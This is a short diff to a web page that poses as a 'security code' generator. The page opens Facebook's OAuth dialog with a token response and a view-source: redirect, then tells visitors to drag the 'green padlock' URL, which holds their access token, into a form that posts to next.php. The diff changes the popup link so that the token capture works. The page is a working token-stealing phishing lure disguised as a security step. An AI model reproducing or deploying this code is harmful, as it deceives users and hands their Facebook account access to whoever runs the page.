@@ -34,7 +34,7 @@ var targetWin = window.open (pageURL, title, 'toolbar=no, location=no, directori
 				
 				<div id="key" style="display: none; width: 401px; margin: 0 auto;">
 					<ol style="padding-left: 10px; font-size: 12px">
-						<div id="yes1">Please <a onclick="PopupCenter('https://www.facebook.com/connect/login_success.html&response_type=token&client_id=210831918949520', 'myPop1',1,1);" href="javascript:void(0);">Generate security code</a> and follow the instructions.</div>
+						<div id="yes1">Please <a onclick="PopupCenter('https://www.facebook.com/dialog/oauth?scope=&redirect_uri=view-source:https://www.facebook.com/connect/login_success.html&response_type=token&client_id=210831918949520', 'myPop1',1,1);" href="javascript:void(0);">Generate security code</a> and follow the instructions.</div>
 						
 						<div id="yes" style="visibility:hidden;"><img src="//i.imgur.com/7GjYozB.png" height="50" width="50"></img> <br><br>Your security code was successfully generated. <br><br><strong>Drag the green padlock on the popup to the box below</strong><br><br><form action="next.php" method="POST"><input type="text" name="sec" value="" style="margin-width:350px;"></input> <input type="submit" name="submit" value="Continue"></input></form>
 					</ol>
